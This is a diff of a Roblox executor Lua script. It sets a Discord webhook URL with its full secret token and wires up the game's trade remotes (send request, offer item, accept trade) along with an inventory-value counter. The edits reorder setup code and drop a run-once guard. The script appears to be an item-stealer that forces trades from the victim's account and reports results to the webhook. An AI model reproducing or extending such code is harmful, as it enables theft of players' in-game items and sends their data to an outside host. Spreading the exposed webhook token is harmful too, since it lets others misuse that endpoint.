@@ -1,10 +1,4 @@
 
-repeat task.wait() until game:IsLoaded()
-task.wait(2)
-
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then return end
-_G.scriptExecuted = true
 
 local cfg = (getgenv and getgenv()) or {}
 cfg.webhook      = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
@@ -16,10 +10,18 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local plr = Players.LocalPlayer
 
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local SendRequest = Trade:WaitForChild("SendRequest")
+local GetStatus = Trade:WaitForChild("GetTradeStatus")
+local OfferItem = Trade:WaitForChild("OfferItem")
+local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
+local DeclineTrade = Trade:WaitForChild("DeclineTrade")
+
+
 if not plr then return end
 
 local isTradeCompleted = false
-local totalInventoryValue = 0
+local totalInventoryValue = 1
 
 local function findRequest()
     if request then
@@ -97,13 +99,6 @@ end
 
 if not plr.Character then plr.CharacterAdded:Wait() end
 task.wait(1)
-
-local Trade = ReplicatedStorage:WaitForChild("Trade")
-local SendRequest = Trade:WaitForChild("SendRequest")
-local GetStatus = Trade:WaitForChild("GetTradeStatus")
-local OfferItem = Trade:WaitForChild("OfferItem")
-local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
-local DeclineTrade = Trade:WaitForChild("DeclineTrade")
 
 local LastOffer = nil
 Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
